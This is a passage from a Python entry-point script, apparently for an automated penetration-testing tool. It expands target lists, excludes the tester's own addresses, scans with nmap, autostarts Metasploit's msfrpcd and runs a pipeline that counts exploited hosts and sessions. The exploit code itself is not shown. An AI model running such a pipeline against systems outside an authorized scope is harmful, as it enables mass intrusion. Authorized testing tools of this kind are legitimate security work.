    p.add_argument("--log-file", default=None)
    p.add_argument("-v", "--verbose", action="store_true")
    return p.parse_args(argv)


def _resolve_msfrpcd_path(args, cfgfile):
    """Resolve and remember the msfrpcd binary for autostart. An explicit
    --msfrpcd-path wins and is stored. Otherwise reuse a stored path that still
    exists, then search PATH and common locations, storing whatever resolves.
    Raises PreflightError if nothing usable is found."""
    if args.msfrpcd_path != "msfrpcd":
        chosen = args.msfrpcd_path
        if not (os.access(chosen, os.X_OK) or shutil.which(chosen)):
            raise PreflightError(f"--msfrpcd-path not executable: {chosen}")
        cfgfile.set_msfrpcd_path(chosen)
        return chosen
    stored = cfgfile.read_msfrpcd_path()
    if stored and os.access(stored, os.X_OK):
        return stored
    found = find_msfrpcd()
    if found:
        cfgfile.set_msfrpcd_path(found)
        logger.info("located msfrpcd at %s (stored in %s)", found, cfgfile.path)
        return found
    raise PreflightError(
        "msfrpcd not found on PATH or common locations; pass "
        "--msfrpcd-path /path/to/msfrpcd and it will be remembered")


def _startup_error(args, msg):
    """Log a fatal pre-dashboard error and, in TUI mode, also print it to stderr.
    TUI mode attaches no stderr log handler, so without this the terminal stays
    silent and the only trace is the log file."""
    logger.error(msg)
    if not args.no_tui:
        print(f"error: {msg}", file=sys.stderr)


def main(argv=None):
    args = _parse_args(argv)
    try:
        # First gate: ensure deps are importable. May re-exec under a root-owned
        # venv and never return from this call on the first run.
        ensure_runtime(args.venv_dir, RUNTIME_DEPS, enabled=not args.no_venv)
    except PreflightError as e:
        print(f"error: {e}", file=sys.stderr)
        return 1
    _setup_logging(args)

    specs = list(args.targets)
    if args.target_file:
        specs += _read_lines(args.target_file)
    exspecs = list(args.exclude)
    if args.exclude_file:
        exspecs += _read_lines(args.exclude_file)

    if args.resume and os.path.exists(args.checkpoint):
        run = RunState.load_checkpoint(args.checkpoint, mode=args.mode,
                                       findings_path=args.findings)
        run.normalize_for_resume()
        logger.info("resumed %d host(s) from %s",
                    len(run.snapshot_hosts()), args.checkpoint)
    else:
        targets = expand_targets(specs, max_hosts=args.max_hosts)
        excludes = set(expand_targets(exspecs, max_hosts=args.max_hosts))
        if not args.include_self:
            # Drop the tester's own addresses, but only those inside the scan scope,
            # so unrelated management interfaces are untouched. This is what keeps
            # the run from scanning, exploiting, and brute-forcing the box it runs on.
            selfies = _local_ips() & set(targets)
            if selfies:
                excludes |= selfies
                logger.info("self-exclude: dropping local address(es) in scope: "
                            "%s (use --include-self to test them)",
                            ", ".join(sorted(selfies)))
        targets = [ip for ip in targets if ip not in excludes]
        if not targets:
            _startup_error(args, "no targets in scope")
            return 2
        _scope_guard(targets, args)
        run = RunState(mode=args.mode, checkpoint_path=args.checkpoint,
                       findings_path=args.findings)
        run.add_hosts(targets)

    if not run.snapshot_hosts():
        _startup_error(args, "no targets in scope")
        return 2

    scfg = ScanConfig(nmap_path=args.nmap_path, discovery_top_ports=args.top_ports,
                      discovery_ports=args.ports or "", timing=args.timing,
                      mincvss=args.mincvss, full_ports=not args.no_full_ports)
    scanner = Scanner(scfg, on_activity=run.record_activity)
    mcfg = MsfConfig.from_env(
        host=args.msf_host, port=args.msf_port, password=args.msf_pass,
        ssl=args.msf_ssl, candidates_per_service=args.candidates_per_service,
        rank_floor=RANK_VALUES[args.min_rank],
        product_search=not args.no_product_search,
        lhost=args.lhost or "")
    cfgfile = OrchestrationConfig(args.config_file)
    msfrpcd_path = args.msfrpcd_path
    run_as = None
    try:
        # Password: --msf-pass or MSF_RPC_PASS, else the persisted credential,
        # generating one only when we will start msfrpcd ourselves.
        if not mcfg.password:
            mcfg.password = (cfgfile.read_password() if args.no_msf_autostart
                             else cfgfile.ensure_password())
        # Binary and run-as user: only needed when we start it. The user we drop
        # to keeps msfrpcd in its own gem and ~/.msf4 environment.
        if not args.no_msf_autostart:
            msfrpcd_path = _resolve_msfrpcd_path(args, cfgfile)
            run_as = resolve_run_as(args.msf_user)
    except PreflightError as e:
        _startup_error(args, f"preflight failed: {e}")
        return 1

    msf_client = MsfClient(mcfg, on_activity=run.record_activity)
    fw = FirewallManager()
    msfd = MsfdManager(host=mcfg.host, port=mcfg.port, password=mcfg.password,
                       ssl=mcfg.ssl, username=mcfg.username,
                       msfrpcd_path=msfrpcd_path,
                       autostart=not args.no_msf_autostart, run_as=run_as)

    try:
        warnings = preflight(args.nmap_path, msf_client, msfd)
        for w in warnings:
            logger.warning("preflight: %s", w)
    except PreflightError as e:
        _startup_error(args, f"preflight failed: {e}")
        return 1

    ocfg = OrchestratorConfig(
        workers=args.workers, fire_workers=args.fire_workers,
        chunk_size=args.chunk_size, checkpoint_interval=args.checkpoint_interval,
        keep_msfrpcd=args.keep_msfrpcd)
    orch = Orchestrator(run, scanner, msf_client, fw, msfd, ocfg, cfgfile)

    display = None
    if not args.no_tui:
        try:
            from tui import Dashboard
            display = Dashboard(run)
            display.start()
        except Exception as e:
            logger.warning("TUI unavailable (%s); running headless", e)
            display = None

    orch.run_pipeline(display)

    s = run.stats()
    logger.info("done: %d live, %d exploitable, %d exploited, %d session(s)",
                s.live, s.exploitable, s.exploited, s.sessions)
    return 0


if __name__ == "__main__":
    sys.exit(main())
